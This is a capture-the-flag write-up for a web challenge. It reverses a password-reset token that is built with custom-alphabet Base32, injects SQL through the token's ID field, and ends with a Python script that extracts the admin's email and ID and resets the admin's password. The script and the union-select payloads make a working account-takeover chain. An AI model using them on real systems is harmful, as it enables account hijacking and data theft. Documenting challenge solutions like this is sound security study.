# Recognition

After creating an account, we can choose a password via a sort of magic link.  

This link is built with an `h` parameter, which is associated with the account we just created.  

Also, this link is always valid, even after changing the password.  

When logged into our account, we have an email and an ID (commented). This corresponds to the `support` account.  

# Analysis of the `h` parameter

## Link formation  

The longer the email address used to create the account, the longer `h` is. We can assume that `h` is an encoding of the email. The username does not seem to have an impact.  

- abc@mail.fr => `mfrggqdnmfuwyI7g0j6dcnr7pr1f07sn1uq3gvcg`
- abcdefghijklmnopqrstuvwxyz0123456789_9876543210zyxwvutsrqponmlkjihgfedcba@mail.fr => `mfrggzdfmz7wq9Iknnwg987p0byx358u0v8h06dzp1ydcmr7gq97mnzyhfp7s0bxgy971mzsg3yhu6Iy048hk4d70jyxA880nvwgw97jnb7wmzI3mnrgcqdnmfuwyI7g0j6dcnrspr1f07sn1uq3gvcg`

_note: The beginning of the string is identical (`mfrgg`). We can assume this corresponds to `abc` from our email, meaning the email is indeed encoded at the beginning of the string._

## Behavior with fake `h` values  

By adding characters to our link, we observe different behaviors:  

When adding characters not present in the original string (e.g., `B`):  
- A 500 error: Impossible to decode input  

When adding characters (present in the original string, like `0`) at the end of `h`:  
- Still a valid `h`

When adding characters (present in the original string, like `0`) in the middle of `h`:  
- A 404 error  

This leads to several assumptions:  
- The end of `h` is not considered when retrieving the account.  
- The 404 error appears when we modify the original email and the user is not found.  

## Analysis of the encoded string  

To conduct the most accurate analysis (and have the most characters possible), I generated a long `h` using the email `abcdefghijklmnopqrstuvwxyz0123456789_9876543210zyxwvutsrqponmlkjihgfedcba_ABCDEFGHIJKLMNOPQRSTUVWXYZ@mail.fr`.  

We will work with this string:  
`mfrggzdfmz7wq9Iknnwg987p0byx358u0v8h06dzp1ydcmr7gq97mnzyhfp7s0bxgy971mzsg3yhu6Iy048hk4d70jyxA880nvwgw97jnb7wmzI3mnrgcx9b1jbu1rkg1433sssIjrgu579qkfjfgvcvkzIvqwk91bwwc9Imfz7h32brgy8hyucxjzguk1cdkrdA`  

### Detecting the different characters used  

First, I check all the characters that appear at least once:  

```python
def get_used_chars(input):
    c_unique = set()
    for c in input:
        c_unique.add(c)
    l = list(c_unique)
    l.sort()
    return l

chaine = "mfrggzdfmz7wq9Iknnwg987p0byx358u0v8h06dzp1ydcmr7gq97mnzyhfp7s0bxgy971mzsg3yhu6Iy048hk4d70jyxA880nvwgw97jnb7wmzI3mnrgcx9b1jbu1rkg1433sssIjrgu579qkfjfgvcvkzIvqwk91bwwc9Imfz7h32brgy8hyucxjzguk1cdkrdA"
print("".join(get_used_chars(chaine)))
```

The result is: `0123456789AIbcdfghjkmnpqrsuvwxyz`  

A string of length 32. We assume we are using Base32 with a custom alphabet.  

We can validate this hypothesis using https://dencode.com  
By inputting `abcdefghijklmnopqrstuvwxyz0123456789_9876543210zyxwvutsrqponmlkjihgfedcba_ABCDEFGHIJKLMNOPQRSTUVWXYZ`, the beginning of the Base32 encoded string `MFRGGZDFMZTWQ2LKN` is similar to ours.  

### Reconstructing the encoding algorithm  

Now, we need to determine the order of the custom alphabet to be able to craft `h` values.  

Here is a summary of the method to decode a Base32 string (the same method applies to all bases):  

- We take the input string: `test`  
- Convert this string to binary: `01110100011001010111001101110100`  
- Split this binary string into 5-bit blocks (2^5 = 32, our base): `01110 10001 10010 10111 00110 11101 00`  
- Each block corresponds to an index in the alphabet: 14 17 18 ...  
- With this alphabet `0123456789AIbcdfghjkmnpqrsuvwxyz`, we find:  
    - "0123456789AIbcdfghjkmnpqrsuvwxyz"[14] = d  
    - "0123456789AIbcdfghjkmnpqrsuvwxyz"[17] = h  
    - "0123456789AIbcdfghjkmnpqrsuvwxyz"[18] = j  
The beginning of the encoding for "test" with this alphabet is `dhj`.  

Now that we know how to encode a string using an alphabet, we can create an algorithm to determine the alphabet from an encoded string, as well as the original string.  

```python
message_to_encode = (
    "abcdefghijklmnopqrstuvwxyz0123456789_9876543210zyxwvutsrqponmlkjihgfedcba_ABCDEFGHIJKLMNOPQRSTUVWXYZ@mail.fr"
)
message_encoded = "mfrggzdfmz7wq9Iknnwg987p0byx358u0v8h06dzp1ydcmr7gq97mnzyhfp7s0bxgy971mzsg3yhu6Iy048hk4d70jyxA880nvwgw97jnb7wmzI3mnrgcx9b1jbu1rkg1433sssIjrgu579qkfjfgvcvkzIvqwk91bwwc9Imfz7h32brgy8hyucxjzguk1cdkrdA"
def find_alphabet(start, encoded):
    bin_to_check = ""
    for i in start:
        bin_to_check += format(ord(i), "#010b")[2:]
    z = ["_" for i in range(32)]
    i = 0
    for chunk in [bin_to_check[i:i+5] for i in range(0, len(bin_to_check), 5)]:
        index = int(chunk, 2)
        char = encoded[i]
        z[index] = char
        i+=1
    return "".join(z)
print((find_alphabet(message_to_encode, message_encoded)))
```

We obtain `Ab3d3fgh1jkImn0pqrs7uvwxyz98546_`.  

A character is missing at the end because our input string is too small.  

Additionally, some characters are inconsistent or appear twice (here, the `3`).  

This means that our input string is too small compared to the encoded message (suggesting that more than just the email is encoded) and that the padding is incorrect.  

However, we can easily deduce the custom alphabet: the `2` is missing at the end, and the first `3` should be a `c`.  

The final alphabet is `Abcd3fgh1jkImn0pqrs7uvwxyz985462`.  

We can try decoding our encoded string using this alphabet on [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base32('Abcd3fgh1jkImn0pqrs7uvwxyz985462%3D',true)&input=bWZyZ2d6ZGZtejd3cTlJa25ud2c5ODdwMGJ5eDM1OHUwdjhoMDZkenAxeWRjbXI3Z3E5N21uenloZnA3czBieGd5OTcxbXpzZzN5aHU2SXkwNDhoazRkNzBqeXhBODgwbnZ3Z3c5N2puYjd3bXpJM21ucmdjeDliMWpidTFya2cxNDMzc3NzSWpyZ3U1Nzlxa2ZqZmd2Y3Zrekl2cXdrOTFid3djOUltZno3aDMyYnJneThoeXVjeGp6Z3VrMWNka3JkQQ).  

The result is conclusive:  
`abcdefghijklmnopqrstuvwxyz0123456789_9876543210zyxwvutsrqponmlkjihgfedcba_ABCDEFGHIJKLMNOPQRSTUVWXYZ@mail.fr|166|PWNME CTF`  

So, we have the format:  
`email|user_id|PWNME CTF`  

_The final string `PWNME CTF` is used to handle a padding issue and can be replaced with anything._  

We can now craft our own `h`.  

## Crafting a Custom `h`  

With the support account, we can test our crafted `h`. We already have its email and ID. Once logged into the support account, we see that we are still not an admin but just a "support" user.  

We need to find a way to retrieve the `email` and `id` of the admin.  

- `email|id|PWNME CTF`  
    - Returns a 500 error  
- `email@test.fr|id|PWNME CTF`  
    - Returns a 404 error  

=> We need a valid email.  

- `email@test.fr|id'|PWNME CTF`  
    - There is an sql error  
- `email@test.com|id' or 1--|PWNME CTF`  
    - Returns a valid account  

We have an SQLi in the `id` parameter.  

The SQLi is only present on the GET endpoint of `/change-password`.  

When we send a request to `POST /api/change-password`, the `h` must be valid to change a user's password. Therefore, we need to know the admin's ID and email to create a valid `h` and change their password.  

## Exploit  

Here is my script to retrieve the admin's email and ID and change their password.  

```py
import requests
import re

alphabet = "Abcd3fgh1jkImn0pqrs7uvwxyz985462"

BASE_URL = "http://instance"


def to_custom_base32(input):
    to_bin = ""
    for i in input:
        to_bin += format(ord(i), "#010b")[2:]
    out = ""
    for chunk in [to_bin[i : i + 5] for i in range(0, len(to_bin), 5)]:
        index = int(chunk, 2)
        out += alphabet[index]
    return out


def send_payload(payload):
    r = requests.get(f"{BASE_URL}/change-password?h={to_custom_base32(payload)}")
    if r.status_code == 200:
        m = re.search(r"password for(.*?)<input", r.text, re.DOTALL)
        return m.group(1).strip()
    else:
        return f"Error {r.status_code}"


def send_sqli(payload):
    return send_payload(f"fake@mail.fr|{payload}|PADDING")


def change_password(mail, id, new_password):
    r = requests.post(
        f"{BASE_URL}/api/change-password?h={to_custom_base32(f'{mail}|{id}|PADDING')}",
        json={"password": new_password},
    )
    if r.status_code == 200:
        return True
    else:
        return f"Error {r.status_code}"


# print(send_sqli("111111' union select group_concat(tbl_name) FROM sqlite_master WHERE type='table' --"))
# user

# print(send_sqli("111111' union select sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='user' --"))
# CREATE TABLE user (
#         id INTEGER NOT NULL,
#         username VARCHAR(100) NOT NULL,
#         mail VARCHAR(100) NOT NULL,
#         password VARCHAR NOT NULL,
#         role VARCHAR NOT NULL,
#         PRIMARY KEY (id),
#         UNIQUE (mail)
# )

# print(send_sqli("111111' union select role FROM user --"))
# guest

# print(send_sqli("111111' union select role FROM user WHERE role != 'guest'--"))
# support

# print(send_sqli("111111' union select role FROM user WHERE role != 'guest' AND role != 'support'--"))
# top_super_user

email = send_sqli("a' union select mail from user where role='top_super_user'--")
id = send_sqli("a' union select id from user where role='top_super_user'--")
password = "password"

if change_password(email, id, password) is True:
    print(f"Password for {email} (id={id}) has been changed to '{password}'")
else:
    print("Exploit error")
```

Once the admin's password is changed, we can log into their account and retrieve the flag.  

